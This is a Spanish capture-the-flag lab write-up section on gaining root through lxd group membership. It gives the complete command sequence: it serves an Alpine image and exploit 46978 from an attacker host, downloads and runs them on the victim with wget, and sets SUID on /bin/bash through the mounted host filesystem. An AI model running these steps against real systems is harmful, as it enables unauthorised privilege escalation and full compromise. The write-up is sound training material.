## Escalada de privilegios {-}

### Rootear la maquina {-}

```bash
whoami
id
```

En este punto vemos que el usuario xalvas esta en el grupo **lxd** y ya tenemos la posibilidad de escalar privilegios con esto.

```bash
searchsploit lxd
searchsploit -x 46978
```

Si Si el exploit a sido creado por el mismo S4vitar. Para usar el exploit, lo primero es mirar si estamos en una maquina 32 o 64 bits.

```bash
uname -a
```

Seguimos los pasos del exploit

1. En la maquina de atacante

    ```bash
    wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
    chmod +x build-alpine
    ./build-alpine # --> para maquinas x64
    ./build-alpine -a i686 # --> para maquinas i686
    searchsploit -m 46978
    mv 46978.sh lxd_privesc.sh
    dos2unix lxd_privesc.sh
    python3 -m http.server 80
    ```

1. En la maquina victima

    ```bash
    wget http://10.10.14.20/alpine-v3-14-i686-20210728_2134.tar.gz
    wget http://10.10.14.20/lxd_privesc.sh
    chmod +x lxd_privesc.sh
    ./lxd_privesc.sh -f alpine-v3-14-i686-20210728_2134.tar.gz
    ```

1. vemos un error `error: This must be run as root`. Modificamos el fichero lxd_privesc.sh

    ```bash
    nano lxd_privesc.sh
    ```

    en la function createContainer(), borramos la primera linea:
    
    ```bash
    # lxc image import $filename --alias alpine && lxd init --auto
    ```

1. Ya estamos root pero en el contenedor. Modificamos la `/bin/bash` de la maquina

    - en el contenedor

        ```bash
        cd /mnt/root
        ls
        cd /bin
        chmod 4755 bash
        exit
        ```

    - en la maquina victima

        ```bash
        bash -p
        whoami
        #Output
        root
        ```